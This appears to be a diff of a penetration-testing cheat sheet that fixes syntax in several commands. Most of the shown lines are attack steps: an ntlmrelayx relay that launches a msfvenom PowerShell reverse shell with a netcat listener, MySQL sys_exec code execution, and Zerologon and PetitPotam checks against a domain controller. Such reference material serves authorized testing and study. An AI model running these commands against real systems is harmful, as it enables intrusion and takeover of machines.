@@ -1236,7 +1236,7 @@ ajaxRequest.send(params);
 ### 2.6.8 WordPress
 
 ```sh
-wpscan --update --url http://$VICTIM_IP/
+wpscan --update -o wp-scan.txt --url http://$VICTIM_IP/
 
 # --enumerate options:
 # p = Popular plugins
@@ -2028,7 +2028,7 @@ show variables like 'plugin%';
 
 -- Try to execute code (try all ways)
 \! id
-select sys_exec('id')
+select sys_exec('id');
 select do_system('id');
 
 -- Try to read files
@@ -4481,7 +4481,7 @@ When you can't crack an NTLMv2 hash that you were able to capture with Responder
 # '-c' flag is command to run
 # here we are generating a powershell reverse shell one-liner
 # as base64-encoded command
-sudo impacket-ntlmrelayx -t VICTIM_IP -no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n')"
+sudo impacket-ntlmrelayx -t VICTIM_IP --no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n')"
 
 # start a netcat listener to catch the reverse shell
 sudo nc -nvlp 443
@@ -5406,7 +5406,7 @@ When you start your internal pentest, these are the first modules you should try
 
 ```sh
 # Zerologon
-- [ ] crackmapexec smb DC_IP -u '' -p '' -M zerologon
+crackmapexec smb DC_IP -u '' -p '' -M zerologon
 
 # PetitPotam
 crackmapexec smb DC_IP -u '' -p '' -M petitpotam
